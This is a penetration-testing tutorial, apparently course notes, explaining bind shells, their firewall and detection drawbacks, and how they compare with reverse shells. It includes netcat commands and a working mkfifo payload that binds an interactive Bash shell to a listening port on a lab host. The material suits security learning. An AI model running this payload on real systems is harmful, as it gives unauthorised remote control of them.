

# Bind Shells

In penetration testing, gaining a shell allows us to remotely control a target system through its operating system shell using our local terminal emulator. This is commonly achieved using **bind shells** or **reverse shells**. This section focuses on **bind shells**.

---

## What Is a Bind Shell?

A **bind shell** is a shell where the **target system starts a listener** on a specific port and **waits for the attacker to connect**.

* The **target acts as the server**
* The **attacker acts as the client**
* Once connected, the attacker interacts with the target’s shell

### Connection Direction

```
Attacker  →  Target:PORT
```

### Example

* Attacker: `10.10.14.15`
* Target: `10.10.14.20`
* Port: `1337`

The attacker connects directly to `10.10.14.20:1337`.

---

## Challenges of Bind Shells

Bind shells are simple in theory but difficult to use in real environments due to security controls.

### Common Issues

* **Listener requirement**

  * A listener must already be running on the target
  * Otherwise, the attacker must find a way to start one

* **Firewall restrictions**

  * Incoming connections are usually blocked
  * Host-based firewalls (Windows Firewall, iptables, ufw) commonly deny listening ports

* **NAT and PAT**

  * Public networks rarely allow inbound access to internal hosts
  * Attackers often need internal network access

* **Detection**

  * Inbound connections are easier to detect and block

Because of these limitations, bind shells are **easier to defend against** than reverse shells.

---

## Netcat and Bind Shells

**Netcat (nc)** is widely used to demonstrate bind shells.

Netcat capabilities include:

* TCP and UDP communication
* IPv4 and IPv6 support
* Listening and connecting on ports
* Redirecting standard input and output

In bind shell scenarios:

* **Target** runs Netcat as a listener
* **Attacker** connects using Netcat as a client

---

## Practicing with GNU Netcat

### Step 1: Start a Listener on the Target (No Shell Yet)

On the **target system**:

```bash
nc -lvnp 7777
```

This opens TCP port 7777 and waits for incoming connections. At this stage, it is only a raw TCP session, not a shell.

---

### Step 2: Connect from the Attacker

On the **attack box**:

```bash
nc -nv 10.129.41.200 7777
```

If successful, a TCP connection is established. Text can be exchanged, but no system commands can be executed.

---

## Why This Is Not a Shell

At this point:

* You cannot run OS commands
* You cannot access the filesystem
* You are only sending text over a TCP pipe

To make this a **real bind shell**, the TCP connection must be attached to a command interpreter such as **Bash**.

---

## Establishing a Real Bind Shell

### Step 3: Bind Bash to the Network Port (Payload)

On the **target system**:

```bash
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

### Explanation

* `mkfifo /tmp/f` creates a named pipe
* `/bin/bash -i` starts an interactive shell
* `2>&1` redirects error output
* `nc -l 7777` listens for connections
* Pipes connect Bash input/output to the network socket

This effectively **binds the shell to the TCP port**.

---

### Step 4: Attacker Connects to the Bind Shell

On the **attack box**:

```bash
nc -nv 10.129.41.200 7777
```

Successful connection results in an interactive shell:

```
Target@server:~$
```

You now have:

* Command execution
* Filesystem access
* Full shell interaction

---

## Key Takeaways

### Bind Shell Characteristics

**Pros**

* Simple to understand
* Useful for learning shell mechanics
* Works well in lab environments

**Cons**

* Requires inbound access
* Blocked by most firewalls
* Easily detected
* Rarely effective in real-world external attacks

---

## Bind Shell vs Reverse Shell

| Feature              | Bind Shell        | Reverse Shell     |
| -------------------- | ----------------- | ----------------- |
| Listener             | Target            | Attacker          |
| Connection Direction | Attacker → Target | Target → Attacker |
| Firewall Friendly    | No                | Yes               |
| Detection Risk       | High              | Lower             |
| Real-World Usage     | Rare              | Common            |

---

## Why Learn Bind Shells?

Even though bind shells are rarely used in real engagements, they teach:

* How shells attach to network sockets
* Input/output redirection concepts
* Payload construction basics
* Why reverse shells are preferred

This knowledge is foundational for exploitation.

